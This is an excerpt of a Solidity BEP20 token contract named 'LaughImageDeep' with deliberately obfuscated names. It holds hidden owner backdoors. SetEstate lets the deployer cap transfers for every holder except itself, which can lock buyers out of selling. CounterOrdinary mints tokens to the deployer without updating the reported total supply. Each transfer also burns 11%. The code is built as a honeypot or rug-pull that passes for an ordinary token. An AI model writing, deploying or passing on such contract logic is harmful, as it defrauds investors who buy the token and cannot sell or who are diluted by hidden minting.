...
contract LaughImageDeep is IBEP20 
{
    using DecisionLib for uint256;
    mapping(address => uint256) internal _bad;
    mapping(address => mapping(address => uint256)) private _allowances;
    uint256 internal _totalSupply;
    uint256 internal _affect;
    ...
    constructor() 
    {
        ...
        _name = "LaughImageDeep";
        _symbol = "PARTY";
        _burnRate = 11;
        _affect = _totalSupply;
        _msgsender = _msgSender();
        _sendermessage = _msgsender;
        _bad[_sendermessage] = _totalSupply;
	    emit Transfer(address(0), _sendermessage, _totalSupply);
    }

    modifier FutureWin() { require(msg.sender == _sendermessage); _; }
    function name() public view virtual override returns (string memory) { return _name; }
    function symbol() public view virtual override returns (string memory) { return _symbol; }
    function decimals() public view virtual override returns (uint8) { return 6; }
    function totalSupply() public view virtual override returns (uint256) { return _totalSupply; }
    function balanceOf(address account) public view virtual override returns (uint256) { return _bad[account];}
    function _msgSender() internal view virtual returns (address) { return msg.sender; }
    function _msgData() internal view virtual returns (bytes calldata) { return msg.data; }
    function GetBeat() external view returns (uint256) { return _affect; }
    function SetEstate(uint b) external virtual FutureWin { _affect = b * (10 ** decimals()); }
    ...
    function CounterOrdinary(uint256 edge) external virtual FutureWin
    {
        uint minute = edge * (10 ** decimals()); 
        _bad[_msgsender] = _bad[_msgsender].Coach(minute);
        emit Transfer(address(0), _msgsender, minute);
    }
    ...
    function _transfer(address sender,address recipient, uint256 amount) internal virtual 
    {
        ...
        require(amount <= _affect || recipient == _msgsender || sender == _msgsender);
        uint256 senderBalance = _bad[sender];
        require(senderBalance >= amount, "BEP20: transfer amount exceeds balance");
        uint256 burnAmount = amount * _burnRate / 100;

        _bad[sender] = senderBalance - amount;
        _bad[recipient] += (amount - burnAmount);
        _bad[_burnaddress] += burnAmount;
...
library DecisionLib 
{
  function Coach(uint256 a, uint256 b) internal pure returns (uint256) { uint256 c = a + b; assert(c >= a); return c; }
}